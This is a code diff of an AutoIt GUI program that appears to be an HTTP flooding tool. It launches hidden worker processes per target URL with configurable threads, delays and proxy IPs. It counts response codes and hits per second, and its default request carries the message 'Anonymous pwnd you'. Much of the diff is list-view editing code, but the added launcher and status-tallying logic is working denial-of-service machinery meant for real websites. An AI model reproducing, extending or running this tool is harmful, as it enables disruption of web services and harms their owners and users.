+		If $aListView[$item][4] >= UBound($atStatus, 2) Then ReDim $atStatus[$aCheckedIndices[0]][$aListView[$item][4] + 1]
+		$UBpid = UBound($Pid)
+		ReDim $Pid[$UBpid + $aListView[$item][4]]
+		For $thread = 1 To $aListView[$item][4]
+			Local $tMemMap
+			$atStatus[$item][$thread] = DllStructCreate("int[7]; int[12]; char[999999]")
+			$pMemory = _MemInit($__ListViewHwnd, DllStructGetSize($atStatus[$item][$thread]), $tMemMap)
+			$atStatus[$item][$thread] = DllStructCreate("int[7]; int[12]; char[999999]", $pMemory)
+			DllStructSetData($atStatus[$item][$thread], 1, 0xffffff, 7)
+			DllStructSetData($atStatus[$item][$thread], 2, $__ListViewHwnd, 1)
+			DllStructSetData($atStatus[$item][$thread], 2, $aListView[$item][16], 2)
+			DllStructSetData($atStatus[$item][$thread], 2, $i, 3)
+			DllStructSetData($atStatus[$item][$thread], 2, $thread, 4)
+			DllStructSetData($atStatus[$item][$thread], 2, $EditHwnd, 5)
+			DllStructSetData($atStatus[$item][$thread], 2, DllStructGetData($tMemMap, 1), 6)
+			DllStructSetData($atStatus[$item][$thread], 2, DllStructGetData($tMemMap, 2), 7)
+			DllStructSetData($atStatus[$item][$thread], 2, $pMemory, 8)
+			DllStructSetData($atStatus[$item][$thread], 2, $aListView[$item][15], 10)
+			DllStructSetData($atStatus[$item][$thread], 2, $lenth, 11)
+			DllStructSetData($atStatus[$item][$thread], 2, GUICtrlRead($TimeBetweenThreads), 12)
+			DllStructSetData($atStatus[$item][$thread], 3, $proxyIP)
+			$Pid[$UBpid + $thread - 1] = Run(@ScriptName & " " & $aListView[$item][1] & " " & DllStructGetData($tMemMap, 1) & " " & $pMemory, @SystemDir, @SW_HIDE, 0x1)
+			Sleep(GUICtrlRead($TimeBetweenThreads))
+		Next
+	Next
+	;_ArrayDisplay($atStatus)
+	;$timeinit = TimerInit()
+	;MsgBox(0, "Time Difference", $Pid)
 	While 1
-		$T0 = TimerInit()
 		Sleep(1000)
 		_MonitorEditState($editCtrl, $editFlag, $__LISTVIEWCTRL, $LVINFO)
 		If GUICtrlRead($Button1) <> 1 Then
@@ -349,38 +437,34 @@ Func Button1Click()
 			Next
 			ExitLoop
 		EndIf
-		If GUICtrlRead($CBresp) = 1 Then GUICtrlSetData($Edit, RegRead("HKCU\Software\soic", "Response"))
+		Response()
 		Local $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Failed = 0, $TotKB1 = 0
-		For $item = 1 To $nCheckedItem
-			For $thread = 1 To $aListView[$item - 1][4]
-				$aStatus = StringSplit(RegRead("HKCU\Software\soic", $item & "Status" & $thread), "|")
-				If @error Then ExitLoop 1
-				$2xx += $aStatus[1]
-				$3xx += $aStatus[2]
-				$4xx += $aStatus[3]
-				$5xx += $aStatus[4]
-				$Failed += $aStatus[5]
-				$TotKB1 += $aStatus[6]
+		For $item = 0 To $aCheckedIndices[0] - 1
+			For $thread = 1 To $aListView[$item][4]
+				$2xx += DllStructGetData($atStatus[$item][$thread], 1, 1)
+				$3xx += DllStructGetData($atStatus[$item][$thread], 1, 2)
+				$4xx += DllStructGetData($atStatus[$item][$thread], 1, 3)
+				$5xx += DllStructGetData($atStatus[$item][$thread], 1, 4)
+				$Failed += DllStructGetData($atStatus[$item][$thread], 1, 5)
+				$TotKB1 += DllStructGetData($atStatus[$item][$thread], 1, 6)
 			Next
+			GUICtrlSetBkColor($aListView[$item][16], DllStructGetData($atStatus[$item][$thread - 1], 1, 7))
 		Next
 		$Hits1 = $2xx + $3xx + $4xx + $5xx
 		$statMsg1 = StringFormat("2xx: %u  3xx: %u  4xx: %u  5xx: %u  Fail: %u  Received, KB: %u  KB/s: %.1f  Hit/s: %.1f", $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB1, $TotKB1 - $TotKB0, $Hits1 - $Hits0)
-		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1)
+		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1, 0)
 		$TotKB0 = $TotKB1
 		$Hits0 = $Hits1
 	WEnd
 EndFunc   ;==>Button1Click
-
 Func GuiClose()
 	Save()
-	If GUICtrlRead($CBreg) = 1 Then RegDelete("HKCU\Software\soic")
 	For $i = 1 To UBound($Pid) - 1
 		ProcessClose($Pid[$i])
 	Next
 	_TermEditLib()
 	Exit
 EndFunc   ;==>GuiClose
-
 Func Save()
 	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
 	;Save settings to ini file
@@ -391,11 +475,11 @@ Func Save()
 				Case -1
 					FileWrite($hFile, _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $item) & @CRLF)
 				Case 2, 3
-					FileWrite($hFile, $lvEditText[$item][$column - 2] & @CRLF)
+					FileWrite($hFile, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column, $lenth) & @CRLF)
 					If $item = $nItemCount - 1 Then ExitLoop
 					FileWrite($hFile, "[$*-PostHeaderSplit-*$]" & @CRLF)
 				Case Else
-					FileWrite($hFile, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column) & @CRLF)
+					FileWrite($hFile, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column, $lenth) & @CRLF)
 			EndSwitch
 		Next
 		If $column = $nColumnCount - 1 Then ExitLoop
@@ -403,76 +487,81 @@ Func Save()
 	Next
 	FileClose(@ScriptName & ".ini")
 EndFunc   ;==>Save
-
-Func ContextMenu($aLVInfo)
+Func ContextMenu($aLVInfo = "", $pressed = "")
 	;create context menu on demand.
 	;----------------------------------------------------------------------------------------------
 	If $DebugIt Then ConsoleWrite(_DebugHeader(StringFormat("MyContext Row:%d Col:%d", $aLVInfo[0], $aLVInfo[1])))
 	;----------------------------------------------------------------------------------------------
-	Local $HelpCtx[11]
-	$HelpCtx[0] = GUICtrlCreateDummy()
-	$HelpCtx[1] = GUICtrlCreateContextMenu($HelpCtx[0])
-	$HelpCtx[2] = GUICtrlCreateMenuItem("Add Item", $HelpCtx[1])
-	$HelpCtx[3] = GUICtrlCreateMenuItem("", $HelpCtx[1])
-	$HelpCtx[4] = GUICtrlCreateMenuItem("Delete Item", $HelpCtx[1])
-	$HelpCtx[5] = GUICtrlCreateMenuItem("", $HelpCtx[1])
-	$HelpCtx[6] = GUICtrlCreateMenuItem("Check Item", $HelpCtx[1])
-	$HelpCtx[7] = GUICtrlCreateMenuItem("", $HelpCtx[1])
-	$HelpCtx[8] = GUICtrlCreateMenuItem("Uncheck Item", $HelpCtx[1])
-	$HelpCtx[9] = GUICtrlCreateMenuItem("", $HelpCtx[1])
-	$HelpCtx[10] = GUICtrlCreateMenuItem("Copy Item", $HelpCtx[1])
-	GUISetState(@SW_SHOW)
-	Local $ctx = _GUICtrlMenu_TrackPopupMenu(GUICtrlGetHandle($HelpCtx[1]), WinGetHandle($Gui), -1, -1, 2, 2, 2)
+	Local $HelpCtx[17], $ctx = "None", $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+	If Not $pressed Then
+		$HelpCtx[0] = GUICtrlCreateDummy()
+		$HelpCtx[1] = GUICtrlCreateContextMenu($HelpCtx[0])
+		$HelpCtx[2] = GUICtrlCreateMenuItem("Add Item", $HelpCtx[1])
+		$HelpCtx[3] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[4] = GUICtrlCreateMenuItem("Delete Item", $HelpCtx[1])
+		$HelpCtx[5] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[6] = GUICtrlCreateMenuItem("Tick Item", $HelpCtx[1])
+		$HelpCtx[7] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[8] = GUICtrlCreateMenuItem("Untick Item", $HelpCtx[1])
+		$HelpCtx[9] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[10] = GUICtrlCreateMenuItem("Copy Item", $HelpCtx[1])
+		$HelpCtx[11] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[12] = GUICtrlCreateMenuItem("Fill Column", $HelpCtx[1])
+		$HelpCtx[13] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[14] = GUICtrlCreateMenuItem("Select All", $HelpCtx[1])
+		$HelpCtx[15] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+		$HelpCtx[16] = GUICtrlCreateMenuItem("Delete Dead", $HelpCtx[1])
+		Local $ctx = _GUICtrlMenu_TrackPopupMenu(GUICtrlGetHandle($HelpCtx[1]), WinGetHandle($Gui), -1, -1, 2, 2, 2)
+	EndIf
 	;----------------------------------------------------------------------------------------------
 	If $DebugIt Then ConsoleWrite(_DebugHeader("MenuItem=" & $ctx))
 	;----------------------------------------------------------------------------------------------
-	Switch $ctx
-		Case $HelpCtx[2]
-			GUICtrlCreateListViewItem("http://|GET|Anonymous pwnd you|User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" _
-					 & @CRLF & "Accept-Encoding" & @CRLF & "gzip" & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html|10||||||60000|60000|30000|30000|0", $__LISTVIEWCTRL)
-			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
-			If $ItemCount = 1 Then Global $lvEditText[1][2]
-			ReDim $lvEditText[$ItemCount][2]
-			$lvEditText[$ItemCount - 1][0] = "Anonymous pwnd you"
-			$lvEditText[$ItemCount - 1][1] = "User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" & @CRLF & "Accept-Encoding" & @CRLF & "gzip" _
-					 & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html"
-		Case $HelpCtx[4]
-			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+	Select
+		Case $ctx = $HelpCtx[2] Or $pressed = 115; Add Item
+			GUICtrlCreateListViewItem("http://|POST|Anonymous pwnd you|User-Agent: Mozilla/%insert%" _
+					 & @CRLF & "Accept-Encoding: gzip" & @CRLF & "Connection: keep-alive" & @CRLF & "Content-type: text/html|10||||||60000|60000|30000|30000|0", $__LISTVIEWCTRL)
+		Case $ctx = $HelpCtx[4] Or $pressed = 46; Delete Item
 			For $i = $items[0] To 1 Step -1
 				_GUICtrlListView_DeleteItem($__LISTVIEWCTRL, $items[$i])
-				_ArrayDelete($lvEditText, $items[$i])
 			Next
-		Case $HelpCtx[6]
-			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+		Case $ctx = $HelpCtx[6]; Check Item
 			For $i = $items[0] To 1 Step -1
 				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], True)
 			Next
-		Case $HelpCtx[8]
-			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+		Case $ctx = $HelpCtx[8]; Uncheck Item
 			For $i = $items[0] To 1 Step -1
 				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], False)
 			Next
-		Case $HelpCtx[10]
-			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+		Case $ctx = $HelpCtx[10] Or $pressed = 114; Copy Item
 			For $i = $items[0] To 1 Step -1
 				GUICtrlCreateListViewItem("", $__LISTVIEWCTRL)
 				Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
 				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $items[$i]))
-				ReDim $lvEditText[$ItemCount][2]
-				$lvEditText[$ItemCount - 1][0] = $lvEditText[$items[$i]][0]
-				$lvEditText[$ItemCount - 1][1] = $lvEditText[$items[$i]][1]
 				For $column = 0 To $nColumnCount - 1
-					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $items[$i], $column), $column)
+					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $items[$i], $column, $lenth), $column)
 				Next
 			Next
-	EndSwitch
+		Case $ctx = $HelpCtx[12] Or $pressed = 116; Fill Column
+			$Fill = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $aLVInfo[8], $aLVInfo[9], $lenth)
+			For $i = $items[0] To 1 Step -1
+				_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $items[$i], $Fill, $aLVInfo[9])
+			Next
+		Case $ctx = $HelpCtx[14] Or $pressed = 117; Select All
+			_GUICtrlListView_SetItemSelected($__LISTVIEWCTRL, -1)
+		Case $ctx = $HelpCtx[16] Or $pressed = 118; Delete Dead
+			For $item = 0 To UBound($atStatus) - 1
+				Local $Hits = 0
+				For $i = 1 To 4
+					$Hits += DllStructGetData($atStatus[$item][$aListView[$item][4]], 1, $i)
+				Next
+				If $Hits = 0 And DllStructGetData($atStatus[$item][$aListView[$item][4]], 1, 5) > 3 Then GUICtrlDelete($aListView[$item][16])
+			Next
+	EndSelect
 EndFunc   ;==>ContextMenu
-
 ;just a dummy function to ignore errors
 Func IgnoreErr()
 	Sleep(1)
 EndFunc   ;==>IgnoreErr
-
 #CS
 	; COM Error Handler
 	; -------------------------
@@ -490,7 +579,6 @@ EndFunc   ;==>IgnoreErr
 	, 10)
 	EndFunc   ;==>MyErrFunc
 #CE
-
 ;===============================================================================
 ; Function Name:	_InitEditLib
 ; Description:		Create the editing controls and registers WM_NOTIFY handler.
@@ -501,15 +589,18 @@ EndFunc   ;==>IgnoreErr
 ; Author(s):
 ; Note(s):		Call this BEFORE you create your listview.
 ;===============================================================================
-Func _InitEditLib($lvInputStart = "", $lvInput1Start = "", $lvEditStart = "", $lvComboStart = "", $lvCombo1Start = "", $lvDataStart = "", $lvListStart = "", $hParent = 0)
+Func _InitEditLib($lvInputStart = "", $lvUDStart = "", $lvEditStart = "", $lvComboStart = "", $lvCombo1Start = "", $lvDataStart = "", $lvListStart = "", $hParent = 0)
 	_TermEditLib()
 	$lvControlGui = GUICreate("LVCONTROL", 0, 0, 1, 1, 0x80000000, -1, $hParent) ; $WS_POPUP = 0x80000000
 	$lvInput = GUICtrlCreateInput($lvInputStart, 0, 0, 1, 1, BitOR(128, 256, 0x00800000), 0) ; $WS_BORDER = 0x00800000 $ES_AUTOHSCROLL = 128 $ES_NOHIDESEL = 256
 	GUICtrlSetState($lvInput, 32) ; 32 = $GUI_HIDE
 	GUICtrlSetFont($lvInput, 8.5)
-	$lvInput1 = GUICtrlCreateInput($lvInput1Start, 0, 0, 1, 1)
-	GUICtrlSetState($lvInput1, 32) ; 32 = $GUI_HIDE
+	$lvUD = GUICtrlCreateInput($lvUDStart, 0, 0, 1, 1, 0x2000); $ES_NUMBER = 0x2000
+	GUICtrlSetState(-1, 32) ; 32 = $GUI_HIDE
+	GUICtrlCreateUpdown($lvUD, 0x0020 + 0x0080) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
+	GUICtrlSetLimit(-1, 32767)
 	$lvEdit = GUICtrlCreateEdit($lvEditStart, 0, 0, 1, 1)
+	GUICtrlSetLimit(-1, 99999999999)
 	GUICtrlSetState($lvEdit, 32) ;32 = $GUI_HIDE
 	$lvCombo = GUICtrlCreateCombo($lvComboStart, 0, 0, 1, 1, -1, 0x00000008) ; $WS_EX_TOPMOST = 0x00000008
 	GUICtrlSetState($lvCombo, 32) ; 32 = $GUI_HIDE
@@ -538,7 +629,7 @@ EndFunc   ;==>_InitEditLib
 ;===============================================================================
 Func _TermEditLib()
 	GUICtrlDelete($lvInput)
-	GUICtrlDelete($lvInput1)
+	GUICtrlDelete($lvUD)
 	GUICtrlDelete($lvEdit)
 	GUICtrlDelete($lvCombo)
 	GUICtrlDelete($lvCombo1)
@@ -591,7 +682,6 @@ EndFunc   ;==>_ListView_Click
 ;===============================================================================
 ; Function Name:	ListView_RClick
 ; Description:	Called from WN_NOTIFY event handler.
-
 ; Parameter(s):
 ; Requirement(s):
 ; Return Value(s):
@@ -650,14 +740,17 @@ EndFunc   ;==>_ListView_DoubleClick
 ;===============================================================================
 Func _MonitorEditState(ByRef $editCtrl, ByRef $editFlag, ByRef $__LISTVIEWCTRL, ByRef $LVINFO)
 	Local $pressed = _vKeyCheck()
-	If $editFlag And $pressed = 13 Then; pressed enter
-		_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
-	ElseIf $editFlag And $pressed = 27 Then; pressed esc
-		_CancelEdit()
-	ElseIf Not $editFlag And $pressed = 113 Then; pressed f2
-		MouseClick("primary") ;workaround work all the time (if mouse is over the control)
-		MouseClick("primary")
-	EndIf
+	Select
+		Case $editFlag And $pressed = 113 ; pressed f2
+			_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
+		Case Not $editFlag And $pressed = 113; pressed f2
+			MouseClick("primary") ;workaround work all the time (if mouse is over the control)
+			MouseClick("primary")
+		Case $editFlag And $pressed = 27; pressed esc
+			_CancelEdit()
+		Case $pressed = (46 Or 114 Or 115 Or 116 Or 117) And WinActive($Gui) = $Gui ;delete,f3,f4,f5
+			ContextMenu($LVINFO, $pressed)
+	EndSelect
 EndFunc   ;==>_MonitorEditState
 ;===============================================================================
 ; Function Name:	_LVUpdate
@@ -666,7 +759,6 @@ EndFunc   ;==>_MonitorEditState
 ;						$__LISTVIEWCTRL	 - IN/OUT -
 ;						$iRow				 - IN -
 ;						$iCol				 - IN -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -678,11 +770,8 @@ Func _LVUpdate(ByRef $editCtrl, ByRef $__LISTVIEWCTRL, $iRow, $iCol)
 	If $bCanceled Then Return
 	Local $newText = GUICtrlRead($editCtrl)
 	If $editCtrl = $lvList Or $editCtrl = $lvCombo Then
-		If $newText <> "" Then
-			_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $iRow, $newText, $iCol)
-		EndIf
+		If $newText <> "" Then _GUICtrlListView_SetItemText($__LISTVIEWCTRL, $iRow, $newText, $iCol)
 	Else
-		If $editCtrl = $lvEdit Then $lvEditText[$iRow][$iCol - 2] = $newText
 		_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $iRow, $newText, $iCol)
 	EndIf
 	$LVINFO[6] = $iRow
@@ -696,7 +785,6 @@ EndFunc   ;==>_LVUpdate
 ;						$row			- IN -
 ;						$col		 	- IN -
 ;						$aRect		- IN/OUT -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -729,7 +817,6 @@ EndFunc   ;==>_GUICtrlListViewGetSubItemRect
 ; Description:		Bring forth the editing control and set focus on it.
 ; Parameter(s):	$LVINFO		 	- IN -
 ;						$LVcolControl	- IN -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -747,7 +834,6 @@ Func _InitEdit($LVINFO, $LVcolControl)
 		_CancelEdit()
 		$bCALLBACK = False
 	EndIf
-
 	If $editFlag = 1 Then _CancelEdit()
 	Local $CtrlType
 	If $LVINFO[0] < 0 Or $LVINFO[1] < 0 Then Return 0
@@ -772,8 +858,8 @@ Func _InitEdit($LVINFO, $LVcolControl)
 		Case 16
 			$editCtrl = $lvCombo1
 		Case 32
-			GUICtrlSetData($lvInput1, "")
-			$editCtrl = $lvInput1
+			GUICtrlSetData($lvUD, "")
+			$editCtrl = $lvUD
 		Case 64
 			GUICtrlSetData($lvEdit, "")
 			$editCtrl = $lvEdit
@@ -795,16 +881,11 @@ Func _InitEdit($LVINFO, $LVcolControl)
 		WinMove($lvControlGui, "", $editCtrlPos[0] + ($x1 - 1), $editCtrlPos[1] + ($y1 - 1), $editCtrlPos[2], $editCtrlPos[3])
 		;		GUICtrlSetPos($editCtrl, $editCtrlPos[0],$editCtrlPos[1], $editCtrlPos[2],$editCtrlPos[3])
 		GUICtrlSetPos($editCtrl, 0, 0, $editCtrlPos[2], $editCtrlPos[3])
-		If $editCtrl = $lvEdit Then
-			GUICtrlSetData($editCtrl, $lvEditText[$LVINFO[0]][$LVINFO[1] - 2])
-		Else
-			Local $oldText = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
-		EndIf
+		Local $oldText = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1], $lenth)
 		If $DebugIt Then ConsoleWrite($oldText & @LF)
 		GUICtrlSetState($__LISTVIEWCTRL, 8192) ; 8192 = $GUI_NOFOCUS
 		If $DebugIt Then ConsoleWrite(_GetClassName($editCtrl) & @LF)
 		Switch $editCtrl
-			Case $lvEdit
 			Case $lvList
 				If $oldText <> "" Then GUICtrlSetData($editCtrl, $oldText)
 			Case $lvCombo, $lvCombo1
@@ -819,7 +900,6 @@ Func _InitEdit($LVINFO, $LVcolControl)
 				GUICtrlSetData($editCtrl, $oldText)
 		EndSwitch
 		$editFlag = 1
-
 		GUICtrlSetState($__LISTVIEWCTRL, 8192) ; 8192 = $GUI_NOFOCUS
 		If $DebugIt Then ConsoleWrite("Set pos" & @LF)
 		$nAddHight = 0
@@ -836,7 +916,6 @@ Func _InitEdit($LVINFO, $LVcolControl)
 	EndIf
 	If $DebugIt Then ConsoleWrite("Leaving _InitEdit()" & @LF)
 EndFunc   ;==>_InitEdit
-
 Func _MoveControl()
 	If $bInitiated = True Then
 		Local $editCtrlPos = _CalcEditPos($__LISTVIEWCTRL, $LVINFO)
@@ -875,7 +954,6 @@ Func _CalcEditPos($nLvCtrl, $aINFO)
 		Else
 			$pos[3] = $y1
 		EndIf
-
 	EndIf
 	If _LvHasCheckStyle($__LISTVIEWCTRL) And $aINFO[1] = 0 And $editCtrl = $lvInput Then
 		;compensate for check box
@@ -884,7 +962,6 @@ Func _CalcEditPos($nLvCtrl, $aINFO)
 	EndIf
 	Return $pos
 EndFunc   ;==>_CalcEditPos
-
 ;===============================================================================
 ; Function Name:	_CancelEdit
 ; Description:		Cancels the editing process, and kills the hot keys.
@@ -921,7 +998,6 @@ EndFunc   ;==>_CancelEdit
 ;						$iRow		 		- IN -
 ;						$iCol		 		- IN -
 ;						$aLVI		 		- IN/OUT -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -945,7 +1021,6 @@ Func _FillLV_Info(ByRef $nLvCtrl, $iRow, $iCol, ByRef $aLVI, $iFlag = 1)
 	Sleep(10)
 	Return 1
 EndFunc   ;==>_FillLV_Info
-
 Func WM_ACTIVATE($hWndGUI, $MsgID, $wParam, $lParam)
 	#forceref $hWndGui,$MsgID,$wParam, $lParam
 	;Local $wa = _LoWord($wParam)
@@ -959,7 +1034,6 @@ Func WM_ACTIVATE($hWndGUI, $MsgID, $wParam, $lParam)
 	EndIf
 	Return 0
 EndFunc   ;==>WM_ACTIVATE
-
 ;===============================================================================
 ; Function Name:	WM_Notify_Events
 ; Description:		Event handler for windows WN_NOTIFY messages
@@ -967,7 +1041,6 @@ EndFunc   ;==>WM_ACTIVATE
 ;						$MsgID		 - IN -
 ;						$wParam		 - IN -
 ;						$lParam		 - IN -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -995,13 +1068,12 @@ Func WM_Notify_Events($hWndGUI, $MsgID, $wParam, $lParam)
 		Case $wParam = $__LISTVIEWCTRL
 			Select
 				Case $event = -100 - 1 ; $LVN_ITEMCHANGED = ($LVN_FIRST - 1)
-					Local $ckcount = _LvGetCheckedCount($__LISTVIEWCTRL)
-					If $LVCHECKEDCNT <> $ckcount Then
-						$LVCHECKEDCNT = $ckcount
+					Local $aCheckedIndices = _LvGetCheckedCount($__LISTVIEWCTRL)
+					If $LVCHECKEDCNT <> $aCheckedIndices[0] Then
+						$LVCHECKEDCNT = $aCheckedIndices[0]
 						$bLVITEMCHECKED = True
 						_CancelEdit()
 					EndIf
-
 				Case $event = -2 ; $NM_CLICK = - 2
 					If $bLVEDITONDBLCLICK = False Then
 						_LVGetInfo($lParam)
@@ -1024,7 +1096,6 @@ Func WM_Notify_Events($hWndGUI, $MsgID, $wParam, $lParam)
 					Else
 						If $editFlag = 1 Then _ListView_Click()
 					EndIf
-
 					$bLVITEMCHECKED = False;
 				Case $event = -3 ; $NM_DBLCLK = - 3
 					ConsoleWrite("$NM_DBLCLK" & @LF)
@@ -1113,19 +1184,16 @@ Func WM_Notify_Events($hWndGUI, $MsgID, $wParam, $lParam)
 			ConsoleWrite($hWndGUI & " " & $event & @LF)
 		EndIf
 	EndIf
-
 	$tagNMHDR = 0
 	$event = 0
 	$lParam = 0
 	Return $retval
 EndFunc   ;==>WM_Notify_Events
-
 Func WM_MOVE_EVENT($hWndGUI, $MsgID, $wParam, $lParam)
 	#forceref $hWndGuI,$MsgID,$wParam,$lParam
 	If $editFlag Then _MoveControl()
 	Return True
 EndFunc   ;==>WM_MOVE_EVENT
-
 ;===============================================================================
 ; Function Name:	WM_Command_Events
 ; Description:		Event handler for windows WN_Command messages
@@ -1133,7 +1201,6 @@ EndFunc   ;==>WM_MOVE_EVENT
 ;						$MsgID		 - IN -
 ;						$wParam		 - IN -
 ;						$lParam		 - IN -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -1180,10 +1247,8 @@ Func WM_Command_Events($hWndGUI, $MsgID, $wParam, $lParam)
 		$bCanceled = False
 		$retval = 0
 	EndIf
-
 	Return $retval
 EndFunc   ;==>WM_Command_Events
-
 ;===============================================================================
 ; Function Name	:	_MakeLong
 ; Description		:	Converts two 16 bit values into on 32 bit value
@@ -1195,7 +1260,6 @@ EndFunc   ;==>WM_Command_Events
 Func _MakeLong($LoWord, $HiWord)
 	Return BitOR($HiWord * 0x10000, BitAND($LoWord, 0xFFFF))
 EndFunc   ;==>_MakeLong
-
 ;===============================================================================
 ; Function Name	:	_LVGetInfo
 ; Description		:
@@ -1216,6 +1280,7 @@ Func _LVGetInfo($lParam, $iFlag = 0)
 	If $clicked_row < -1 Then $clicked_row = -1
 	If $clicked_col > _GUICtrlListView_GetColumnCount($__LISTVIEWCTRL) Then $clicked_col = -1
 	If $clicked_row > _GUICtrlListView_GetItemCount($__LISTVIEWCTRL) Then $clicked_row = -1
+	_GUICtrlStatusBar_SetText($StatusBar1, "Item: " & $clicked_row & "  Col: " & $clicked_col, 1)
 	$tagNMITEMACTIVATE = 0
 	If $iFlag = 0 Then
 		_FillLV_Info($__LISTVIEWCTRL, $clicked_row, $clicked_col, $LVINFO)
@@ -1227,15 +1292,11 @@ Func _LVGetInfo($lParam, $iFlag = 0)
 	If $DebugIt Then ConsoleWrite(_DebugHeader("Col:" & $clicked_col))
 	If $DebugIt Then ConsoleWrite(_DebugHeader("Row:" & $clicked_row))
 	;----------------------------------------------------------------------------------------------
-
 EndFunc   ;==>_LVGetInfo
-
-
 ;===============================================================================
 ; Function Name:	_DebugHeader
-; Description:		Gary's console debug header.
+; Description:		Anonymous's console debug header.
 ; Parameter(s):			$s_text		 - IN -
-;
 ; Requirement(s):
 ; Return Value(s):
 ; User CallTip:
@@ -1249,7 +1310,6 @@ Func _DebugHeader($s_text)
 			"-->" & $s_text & @LF & _
 			"+===========================================================" & @LF
 EndFunc   ;==>_DebugHeader
-
 ;===============================================================================
 ; Function Name:	_GetClassName
 ; Description:		get the classname of a ctrl
@@ -1282,7 +1342,7 @@ EndFunc   ;==>_GetClassName
 ;===============================================================================
 Func _vKeyCheck($dll = "user32.dll")
 	Local $aR, $hexKey, $i
-	Local $vkeys[4] = [1, 13, 27, 113];leftmouse,enter,esc,f2
+	Local $vkeys[8] = [1, 27, 46, 113, 114, 115, 116, 117];leftmouse,esc,delete,f2,f3,f4,f5,f6
 	For $i = 0 To UBound($vkeys) - 1
 		$hexKey = '0x' & Hex($vkeys[$i], 2)
 		$aR = DllCall($dll, "int", "GetAsyncKeyState", "int", $hexKey)
@@ -1291,7 +1351,6 @@ Func _vKeyCheck($dll = "user32.dll")
 	Next
 	Return 0
 EndFunc   ;==>_vKeyCheck
-
 ;===============================================================================
 ; Function Name	:	_HasFocus
 ; Description		:	Return true if control has focus
@@ -1311,7 +1370,6 @@ Func _HasFocus($nCtrl)
 	EndIf
 	Return ($hwnd = ControlGetHandle($Gui, "", ControlGetFocus($Gui, "")))
 EndFunc   ;==>_HasFocus
-
 ;===============================================================================
 ; Function Name	:	_SetLVCallBack
 ; Description		:
@@ -1323,7 +1381,6 @@ EndFunc   ;==>_HasFocus
 Func _SetLVCallBack($CallBack = "_CancelEdit")
 	If $CallBack <> "" Then $LVCALLBACK = $CallBack
 EndFunc   ;==>_SetLVCallBack
-
 ;===============================================================================
 ; Function Name	:	_SetLVContext
 ; Description		:
@@ -1340,7 +1397,6 @@ EndFunc   ;==>_SetLVContext
 ; Function Name	:	_LvHasCheckStyle
 ; Description		:
 ; Parameter(s)		:	$hCtrl		Listview control to check for $LVS_EX_CHECKBOXES style
-;
 ; Requirement(s)	:
 ; Return Value(s)	:
 ; User CallTip		:
@@ -1352,12 +1408,10 @@ Func _LvHasCheckStyle($hCtrl)
 	if (BitAND($style, 0x00000004) = 0x00000004) Then Return True ; $LVS_EX_CHECKBOXES = 0x00000004
 	Return False
 EndFunc   ;==>_LvHasCheckStyle
-
 ;===============================================================================
 ; Function Name	:	_LvGetCheckedCount
 ; Description		:
 ; Parameter(s)		:	$nCtrl		 Listview control to get checked checkbox count.
-;
 ; Requirement(s)	:
 ; Return Value(s)	:	number of checked checkboxes, or zero.
 ; User CallTip		:
@@ -1366,21 +1420,23 @@ EndFunc   ;==>_LvHasCheckStyle
 ;===============================================================================
 Func _LvGetCheckedCount($nCtrl)
